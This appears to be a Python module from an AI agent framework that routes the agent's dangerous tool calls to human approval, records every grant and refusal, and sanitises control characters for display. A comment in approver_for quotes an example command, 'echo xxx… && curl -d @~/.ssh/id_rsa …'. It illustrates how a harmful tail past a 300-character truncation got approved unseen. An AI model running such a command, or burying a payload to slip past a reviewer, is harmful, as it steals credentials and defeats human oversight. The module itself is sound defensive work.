"""Who says yes — and, when nobody can, how the refusal gets heard.

Both governance layers have taken an ``approve=`` callable since they were written, and neither has
ever been given one. The consequence is measured rather than argued: with no approver, a run that
reads anything external has **100%** of its dangerous-class calls refused
(`bench/injection/PREREGISTRATION.md`). The gate was never too strict — there was simply nothing on
the other side of it.

**The failure this module is really built against is not the refusal, it is the silence.** A refused
call returns an ordinary observation string, so the agent reads "[taint: needs review]" like any
other tool result and carries on. The run finishes, the answer is prose, and the receipt says
success. On the 24/7 path that means a position guardian reporting green while it guarded nothing —
and that is indistinguishable, from outside, from a daemon that stopped.

So every refusal is COUNTED, on the run, wherever it happens. An approver that denies loudly is a
policy decision; an approver that denies invisibly is a bug with a configuration file.
"""

from __future__ import annotations

import re
import sys
import threading
from collections.abc import Callable
from dataclasses import dataclass, field
from typing import Any, Protocol

from chimera.governance.pending import shown_action
from chimera.telemetry import get_logger

_log = get_logger("governance.approval")

#: C0 and C1 control characters other than newline and tab: what a terminal OBEYS rather than
#: shows (cursor movement, line erase, OSC 52 clipboard writes).
_CONTROLS = re.compile(r"[\x00-\x08\x0b-\x1f\x7f-\x9f]")


def visible(text: str) -> str:
    """``text`` with every control character written out as ``\\xNN``, for a terminal.

    An action is text the agent wrote, and the whole of it is printed when it is a card asked every
    time. Printed raw, an ESC sequence in it could erase the lines above the prompt or rewrite the
    card the person is approving; written out, the person sees that it is there.
    """
    return _CONTROLS.sub(lambda m: f"\\x{ord(m.group()):02x}", text)


class _HasReason(Protocol):
    reason: str


@dataclass
class ApprovalLedger:
    """Every refusal and grant on one run, so a job can be asked how much it was allowed to do.

    A list rather than a counter: "three writes were refused" is a different sentence from "three
    writes were refused, all of them to the same file", and the second is the one that tells you
    whether the run was blocked or merely nudged.
    """

    refused: list[str] = field(default_factory=list)
    granted: list[str] = field(default_factory=list)

    def record(self, action: str, approved: bool) -> None:
        (self.granted if approved else self.refused).append(action[:200])

    @property
    def blocked(self) -> bool:
        """True when anything at all was refused. The signal a caller must not be able to miss."""
        return bool(self.refused)

    def summary(self) -> str:
        if not self.refused:
            return ""
        return f"{len(self.refused)} action(s) refused for review: " + "; ".join(
            sorted(set(self.refused))[:5]
        )


#: The two layers ask in two shapes: the kernel passes ``(verdict, action)`` and the taint ledger
#: passes ``(assessment,)``. One adapter takes both rather than two near-identical approvers that
#: drift apart — the reason a caller can wire the same policy into both.
Approver = Callable[..., bool]


def _describe(*args: Any) -> tuple[str, str]:
    """(action, reason) out of either call shape.

    The one-argument shape used to return an empty action — the taint ledger described the situation
    in ``reason`` and named nothing else, so every surface (terminal prompt, desktop card, webhook)
    put the same sentence in front of a person for every command. The assessment now carries the
    action; the span, when there is one, is appended to the reason so the person sees the line that
    matched without a new field on any wire.
    """
    if len(args) == 2:
        verdict, action = args
        return str(action), str(getattr(verdict, "reason", "") or "")
    assessment = args[0] if args else None
    reason = str(getattr(assessment, "reason", "") or "")
    span = str(getattr(assessment, "span", "") or "")
    if span and span not in reason:
        reason = f"{reason} — matched: «{span}»"
    return str(getattr(assessment, "action", "") or ""), reason


def _decision_of(*args: Any) -> str:
    """The level of the verdict behind a question: ``review`` unless the caller said otherwise."""
    verdict = args[0] if args else None
    decision = getattr(verdict, "decision", None)
    value = getattr(decision, "value", decision)
    return str(value or "review")


def _facts_of(*args: Any) -> dict[str, Any]:
    """What the question's own objects say about it, for the record (:data:`pending.FACTS`).

    Two call shapes, two sources: a `Verdict` (``(verdict, action)``) names the lexical ``rule`` that
    raised it; a `SequenceAssessment` (``(assessment,)``) names the tainted ``sources`` and, by having
    any, the ``lineage``. Both name the ``tool``, read off the action's first line — the rendering
    every surface already uses (``<tool>\n<command>`` or ``<tool>: <path>``). Nothing here is
    inferred from text a model wrote; an assessment with no sources records no lineage.
    """
    action, _reason = _describe(*args)
    first = action.split("\n", 1)[0].split(":", 1)[0].strip()
    facts: dict[str, Any] = {"tool": first} if first else {}
    head = args[0] if args else None
    rule = getattr(head, "rule", None)
    if isinstance(rule, str) and rule:
        facts["rule"] = rule
    sources = getattr(head, "sources", None)
    if isinstance(sources, (list, tuple)) and sources:
        facts["sources"] = list(sources)
        facts["lineage"] = "tainted"
    elif getattr(head, "tainted_refs", None):
        facts["lineage"] = "tainted"
    # The number that raised the question, when a band produced the verdict. Read off the `Verdict`
    # rather than passed in a second time: the verdict is the object the kernel already built, and a
    # caller that had to remember to forward `p` separately would eventually forget — which is the
    # defect this whole item exists to fix (the card showed a reason and no number, so the answer it
    # collected could not be joined to the probability that asked).
    #
    # `confidence` is the calibrated probability the band put on the verdict; `band` and
    # `decider_model` are the two fields that make it readable. A rule-raised verdict has none of
    # the three, and none is written.
    confidence = getattr(head, "confidence", None)
    if isinstance(confidence, (int, float)):
        facts["p"] = float(confidence)
    band = getattr(head, "band", "")
    if isinstance(band, str) and band:
        facts["band"] = band
    model = getattr(head, "decider_model", "")
    if isinstance(model, str) and model:
        facts["decider_model"] = model
    decision_id = getattr(head, "decision_id", "")
    if isinstance(decision_id, str) and decision_id:
        facts["decision_id"] = decision_id
    return facts


def deny(ledger: ApprovalLedger | None = None) -> Approver:
    """Refuse everything, and say so — the honest headless default.

    Unattended, there is no one to ask, and inventing consent is the one answer that must never be
    available. What changes versus having no approver at all is that the refusal is recorded, so the
    caller can tell "the job did its work" from "the job was not allowed to".
    """

    def approve(*args: Any) -> bool:
        action, reason = _describe(*args)
        if ledger is not None:
            ledger.record(action or reason, approved=False)
        _log.warning("refused (no approver available): %s", reason or action)
        return False

    return approve


#: The attribute :func:`allow` sets on the approver it returns. A question put to that approver is
#: answered yes without anybody reading it, which is the right answer for the kernel's REVIEW under
#: an owner who chose ``allow`` and the wrong one for a question the owner wrote themself — a hook's
#: ``ask`` (`chimera/governance/hooks.py`). Marked on the function rather than inferred from the
#: owner's setting, because the hooks reach several assemblies that build their approver in their own
#: way (`solve`, `crew-isolated`, the app's chat), and the function is the one thing they all pass.
ASKS_NOBODY = "chimera_asks_nobody"


def asks_nobody(approver: Any) -> bool:
    """Whether ``approver`` answers yes without asking anybody — :func:`allow`'s, or a wrapper of it."""
    return bool(getattr(approver, ASKS_NOBODY, False))


def allow(ledger: ApprovalLedger | None = None) -> Approver:
    """Grant everything. Opt-in, never a default, and still recorded.

    For a batch on a workspace whose contents the owner already trusts — where the narrowing costs
    more than it buys and that trade has been made deliberately. The record is what keeps it from
    becoming invisible: a run that was allowed 40 dangerous actions should be able to say so.
    """

    def approve(*args: Any) -> bool:
        action, reason = _describe(*args)
        if ledger is not None:
            ledger.record(action or reason, approved=True)
        return True

    setattr(approve, ASKS_NOBODY, True)
    return approve


#: One terminal, one question at a time.
#:
#: Process-wide and not per-approver, because what it protects is process-wide: there is one stdin
#: and one stderr, and :func:`ask` writes a question to the second and reads the answer from the
#: first. Under fan-out — `solve-batch` runs four workers by default, each with its own approver and
#: its own ledger — two of these interleave into a prompt nobody can answer correctly: the person
#: sees two reasons and one ``[y/N]``, and whichever thread wins ``input()`` takes the answer.
#:
#: `SharedApprovals` solves the same problem for `crew-isolated`, and solves more besides — it
#: reuses one answer across workers, which is right when they share a task and wrong when they do
#: not. This is the half that is always right, so it lives with the only approver that touches the
#: terminal rather than with whichever caller happens to fan out.
_TERMINAL = threading.Lock()


def ask(
    ledger: ApprovalLedger | None = None, *, stream: Any = None, whole_action: bool = False
) -> Approver:
    """Prompt a person. Anything other than an explicit yes is a no.

    Default-deny on EOF, on a closed pipe, and on an unreadable answer — a prompt that treats
    silence as consent is worse than no prompt, because it produces a record of an approval nobody
    gave.

    ``whole_action`` prints the action in full instead of its first 300 characters — for the
    actions asked every time (:func:`always_ask`), where what is shown is what will be published.

    Serialized on :data:`_TERMINAL`, so concurrent callers queue rather than overlap.
    """

    def approve(*args: Any) -> bool:
        action, reason = _describe(*args)
        out = stream or sys.stderr
        _TERMINAL.acquire()
        try:
            print(f"\n[governance] {reason or 'review required'}", file=out)
            if action:
                shown = action if whole_action else shown_action(action)
                print(f"  action: {visible(shown)}", file=out)
            print("  allow this once? [y/N] ", end="", file=out, flush=True)
            answer = input().strip().lower()
        except (EOFError, OSError, KeyboardInterrupt):
            answer = ""
        finally:
            _TERMINAL.release()
        approved = answer in ("y", "yes")
        if ledger is not None:
            ledger.record(action or reason, approved=approved)
        return approved

    return approve


def ask_via(question: Callable[[str, str], bool], ledger: ApprovalLedger | None = None) -> Approver:
    """Prompt a person through a surface's own question, rather than through stdin.

    :func:`ask` writes to a stream and reads ``input()``, which is the right mechanism for a REPL and
    the wrong one for a full-screen app: inside ``chimera tui`` Textual holds the terminal in raw
    mode, so those bytes never arrive and the call blocks until the caller's timeout fires — measured
    at 123.8 s (`bench/right_hand_governance/RESULTS.md` Part 2). ``question`` is handed
    ``(action, reason)`` and is free to draw them however its surface can.

    Everything that makes :func:`ask` safe is kept: anything other than an explicit yes is a no
    (that is now the *surface's* obligation, and the TUI's modal defaults its focus and its Escape
    key to no), and the verdict is recorded either way, so a run can still be asked how much it was
    allowed to do.
    """

    def approve(*args: Any) -> bool:
        action, reason = _describe(*args)
        try:
            approved = bool(question(action, reason))
        except Exception:  # noqa: BLE001 — a surface that cannot ask has not been answered
            _log.warning("the surface could not ask; refusing: %s", (reason or action)[:200])
            approved = False
        if ledger is not None:
            ledger.record(action or reason, approved=approved)
        return approved

    return approve


class ApprovalAnnouncer:
    """A late-bound place to announce a pending question to a screen.

    Built before the surface that will render the question exists — the approver is constructed
    with the tool registry, the stream's ``emit`` a moment later — so this holds the slot. Calling it
    with no ``emit`` bound is not an error: the question is already durable on disk, and a notice to
    nobody is exactly the unattended path's behaviour.
    """

    def __init__(self) -> None:
        self.emit: Any = None

    def __call__(self, question: Any) -> None:
        if self.emit is not None:
            self.emit(question)


def nobody_is_at_a_terminal() -> bool:
    """Whether this process has a console a person could answer a prompt on.

    One copy of the rule, because two of it is how the approver and the refusal end up disagreeing:
    the approver falls back to deny for want of a tty while the message says somebody declined. Both
    `approver_for` and `chimera.governance.profile.govern_step` read this.
    """
    return not sys.stdin or not sys.stdin.isatty()


def deliverer_for(settings: Any) -> Any:
    """How this deployment reaches a person, or ``None`` when it has not said where.

    The presence of an answer here is what separates a durable ask from a fifteen-minute pause
    before the same refusal. `pending.ask_durably` writes the question either way; without somewhere
    to send it, the only person who would ever see it is one who already knew to go looking.

    A failed send is logged and swallowed. The question is on disk and `chimera approve --list`
    still finds it, so a dead webhook costs the notification, not the gate.
    """
    url = str(getattr(settings, "approval_webhook", "") or "").strip()
    if not url:
        return None
    from chimera.server.chat_approval import offers_chat_code

    return WebhookDeliverer(url, offers_chat_code=offers_chat_code(settings))


class WebhookDeliverer:
    """The owner's approval webhook, as a ``deliver`` callable.

    A class rather than a closure for one attribute: ``offers_chat_code`` tells
    `pending.ask_durably` that this channel reaches the owner AND that a bot will accept an answer
    typed back (``CHIMERA_APPROVE_VIA_CHAT`` on, some bot with an allowlist). Only then does a
    question carry a one-time code. Read off the deliverer instead of passed beside it because four
    surfaces build the deliverer and every one of them would have had to remember the second
    argument — and a ``deliver`` that is not this webhook (a test, a screen) never offers one.
    """

    def __init__(self, url: str, *, offers_chat_code: bool = False) -> None:
        self._url = url
        self.offers_chat_code = offers_chat_code

    def __repr__(self) -> str:
        # The URL is a credential: never in a repr a traceback or a log line could print.
        return f"WebhookDeliverer(offers_chat_code={self.offers_chat_code})"

    def __call__(self, text: str) -> None:
        from chimera.scheduler.delivery import deliver_to_webhook

        result = deliver_to_webhook(self._url, text)
        if not result.ok:
            # `detail` is host-only by construction — see `scheduler/delivery.webhook_host_only`.
            # The URL is a credential and this line goes to a log somebody else may read.
            _log.warning("approval question not delivered: %s", result.detail)


def approver_for(
    mode: str,
    ledger: ApprovalLedger | None = None,
    *,
    home: Any = None,
    deliver: Any = None,
    ask_with: Callable[[str, str], bool] | None = None,
    wait_seconds: float | Callable[[], float] | None = None,
) -> Approver:
    """Build the approver for a configured mode: ``ask`` | ``deny`` | ``allow``.

    ``ask_with`` is a surface's own way of asking somebody who **is** at the keyboard — see
    :func:`ask_via`. It is consulted after ``allow``/``deny``, so the owner's configured mode still
    decides first, and before :func:`nobody_is_at_a_terminal`, because that function asks whether
    *stdin* could reach a person and a surface with a modal is not answering through stdin.

    ``wait_seconds`` bounds the durable wait, and matters most where a caller fans out: the default
    is fifteen minutes PER QUESTION, which is a reasonable pause for one run and an afternoon for
    four workers asking a dozen times. ``None`` keeps :data:`pending.WAIT_SECONDS`; it is ignored on
    every branch but the durable one, because that is the only branch that waits.

    ``ask`` degrades to ``deny`` with no terminal attached, which is what a cron job has. Degrading
    the other way — falling back to allow because nobody could be asked — would turn an unattended
    deployment into the most permissive configuration in the product, which is exactly backwards.

    ``home`` opts into asking somebody who is NOT at the keyboard. Without a terminal the three-state
    gate used to collapse into two — every REVIEW became a refusal — so the mandate that says
    "confirm before billing, before a destructive migration, before touching RLS" had nothing to
    confirm with. With a home (and ideally a ``deliver``), the question is written down, sent
    wherever this deployment sends things, and answered with ``chimera approve``. Silence still
    refuses; see :mod:`chimera.governance.pending`.
    """
    mode = (mode or "ask").strip().lower()
    if mode == "allow":
        return allow(ledger)
    if mode == "deny":
        return deny(ledger)
    if ask_with is not None:
        return ask_via(ask_with, ledger)
    # The WHOLE action on both, never its first 300 characters (study 30, S30-04 review). Since a
    # crew approval answers the whole proposal (`shared_approval.py`), what the person is shown must
    # be the whole proposal too: `crew-isolated` asks through here, and a command whose tail came
    # after character 300 — `echo xxx… && curl -d @~/.ssh/id_rsa …` — was approved by someone who
    # saw the harmless opening and a note that there was more. A note is not a reading.
    if nobody_is_at_a_terminal():
        if home is not None:
            return ask_elsewhere(
                home, ledger, deliver=deliver, wait_seconds=wait_seconds, whole_action=True
            )
        _log.info("approval mode 'ask' with no terminal: denying and recording")
        return deny(ledger)
    return ask(ledger, whole_action=True)


def ask_elsewhere(
    home: Any,
    ledger: ApprovalLedger | None = None,
    *,
    deliver: Any = None,
    on_asked: Any = None,
    wait_seconds: float | Callable[[], float] | None = None,
    facts: dict[str, Any] | None = None,
    whole_action: bool = False,
) -> Approver:
    """Ask a person who is elsewhere, and wait. Anything but an explicit yes is a no.

    ``whole_action`` sends the action in full on the text channel (`pending.ask_durably`).

    ``on_asked`` receives the structured question the moment it is written, so a surface that has a
    screen can show it with a button instead of waiting for someone to read a webhook. ``deliver`` is
    the text channel and is unchanged.

    ``wait_seconds`` bounds the wait for a surface that holds a connection open; ``None`` keeps
    :data:`pending.WAIT_SECONDS`. It may be a callable, resolved **per question**, because the right
    wait is not known when the approver is built: the desktop constructs it with the tool registry
    and binds the screen a moment later. A screen that is bound is worth waiting for; one that never
    was is nobody, and waiting for nobody is the timeout this whole design exists to avoid.

    ``facts`` are what the surface knows and the question's objects do not — the ``run_id`` and the
    ``surface`` name — merged under what the objects say (:func:`_facts_of`) onto every record line.
    """
    from chimera.governance.pending import ask_durably

    def approve(*args: Any) -> bool:
        action, reason = _describe(*args)
        extra: dict[str, Any] = {}
        wait = wait_seconds() if callable(wait_seconds) else wait_seconds
        if wait is not None:
            extra["wait_seconds"] = float(wait)
        if whole_action:
            # Only when asked for: callers that replace `ask_durably` (tests, a surface) keep the
            # signature they were written against.
            extra["whole_action"] = True
        approved = ask_durably(
            home, action, reason, deliver=deliver, on_asked=on_asked,
            decision=_decision_of(*args), facts={**(facts or {}), **_facts_of(*args)}, **extra,
        )
        if ledger is not None:
            ledger.record(action or reason, approved=approved)
        return approved

    return approve



def always_ask(
    home: Any,
    ledger: ApprovalLedger | None = None,
    *,
    mode: str = "ask",
    ask_with: Callable[[str, str], bool] | None = None,
    deliver: Any = None,
    on_asked: Any = None,
    wait_seconds: float | Callable[[], float] | None = None,
    facts: dict[str, Any] | None = None,
) -> Approver:
    """An approver that only a person's explicit yes can satisfy, under every configuration.

    For the actions the owner decided are asked EVERY time, whoever runs them and however the rest
    of the deployment is set (study 29, P8.1: ``open_pull_request``). What separates it from
    :func:`approver_for` is the branch it does not have: ``mode="allow"`` is read as ``ask``. An
    owner who chose ``CHIMERA_APPROVAL_MODE=allow`` chose to stop being asked about the taint
    narrowing and the policy kernel's REVIEWs; publishing their code to a remote is not one of
    those, and a standing yes must not become the answer to it.

    ``deny`` still refuses: it only narrows. Nothing is cached, so each call is its own question,
    the property :mod:`chimera.governance.pending` already guarantees for an answer file.

    Who is asked, in order: the surface's own modal (``ask_with``, the TUI); a person at this
    process's terminal when one could actually answer (:func:`chimera.sandbox.confirm.human_can_answer`,
    which a server or the TUI that declared no human answers false); the durable question when
    there is a ``home`` — on the screen through ``on_asked``, on the owner's channel through
    ``deliver``, answerable with ``chimera approve`` — where silence refuses. With none of those,
    nobody can be asked, and that is a recorded refusal.

    The person is shown the WHOLE action on every one of those, never its first 300 characters: on
    the terminal and on the text channel (in several messages when it is long). These are the
    actions whose card is the thing being published, and a cut card is an approval of text nobody
    read — on a phone it stopped inside the commit list, before the description.
    """
    if (mode or "ask").strip().lower() == "deny":
        return deny(ledger)
    if ask_with is not None:
        return ask_via(ask_with, ledger)
    from chimera.sandbox.confirm import human_can_answer

    if human_can_answer():
        return ask(ledger, whole_action=True)
    if home is None:
        return deny(ledger)
    return ask_elsewhere(
        home, ledger, deliver=deliver, on_asked=on_asked, wait_seconds=wait_seconds, facts=facts,
        whole_action=True,
    )
